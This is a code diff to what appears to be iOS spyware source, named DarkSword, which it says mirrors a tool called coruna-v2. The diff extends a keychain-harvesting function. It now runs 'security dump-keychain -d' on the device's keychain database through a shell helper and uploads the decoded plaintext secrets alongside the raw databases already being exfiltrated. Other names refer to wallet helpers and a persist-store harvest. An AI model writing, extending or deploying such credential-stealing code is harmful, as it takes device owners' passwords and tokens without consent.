@@ -290,8 +290,12 @@ static NSString *DSReadFile(NSString *path)
                     (unsigned long)data.length];
 }
 
-/// Uploads the raw system + mobile Keychain databases as category "keychain",
-/// mirroring coruna-v2's dumpKeychain() (system db, mobile db, decoded dump).
+/// Forward declaration: DSExecShell is defined below (after the wallet helpers).
+static NSString *DSExecShell(NSString *command);
+
+/// Uploads the raw system + mobile Keychain databases, then a best-effort
+/// decoded dump via `security dump-keychain` (uses the device's own keys; may
+/// fail without root/entitlements). Mirrors coruna-v2's dumpKeychain().
 static NSString *DSKeychainDump(void)
 {
     NSArray<NSString *> *candidates = @[
@@ -307,9 +311,19 @@ static NSString *DSKeychainDump(void)
             uploaded += 1;
         }
     }
+
+    // Decoded (plaintext) dump via the device's own securityd keys.
+    NSString *decoded = DSExecShell(
+        @"/usr/bin/security dump-keychain -d /private/var/Keychains/keychain-2.db 2>&1");
+    if (decoded.length > 0 && ![decoded hasPrefix:@"popen failed"]) {
+        DarkSwordUpload(@"keychain", @"/usr/bin/security", @"decoded keychain dump",
+                        [decoded dataUsingEncoding:NSUTF8StringEncoding], nil);
+        uploaded += 1;
+    }
+
     return uploaded > 0
-        ? [NSString stringWithFormat:@"uploaded %lu keychain database(s)", (unsigned long)uploaded]
-        : @"keychain-2.db not readable";
+        ? [NSString stringWithFormat:@"uploaded %lu keychain artifact(s)", (unsigned long)uploaded]
+        : @"keychain not readable";
 }
 
 /// Re-runs the persist-store harvest and returns its snapshot JSON.
